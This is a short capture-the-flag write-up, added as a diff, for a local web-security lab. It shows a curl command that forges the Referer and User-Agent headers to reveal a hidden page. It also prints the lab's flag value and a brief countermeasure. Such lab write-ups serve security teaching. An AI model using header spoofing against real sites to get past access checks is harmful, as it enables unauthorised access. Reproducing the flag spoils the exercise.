@@ -1,0 +1,15 @@
+http://192.168.57.3/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
+
+You have a message from Admin in a footer in the source code.
+The message itset is not a faille , but it can become one if important information was inside.
+
+Follow the instruction that could be interpreted like this:
+
+curl -e https://www.nsa.gov/ -A ft_bornToSec http://192.168.57.3/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c | grep flag
+
+-e : for referer page , this mean that we come from this page.
+-A to specific what Brower we are using, it sould be set in the header. 
+
+flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+-------------------------- Countermeasure ----------------------------------------
+    - Don't put important information in footer.
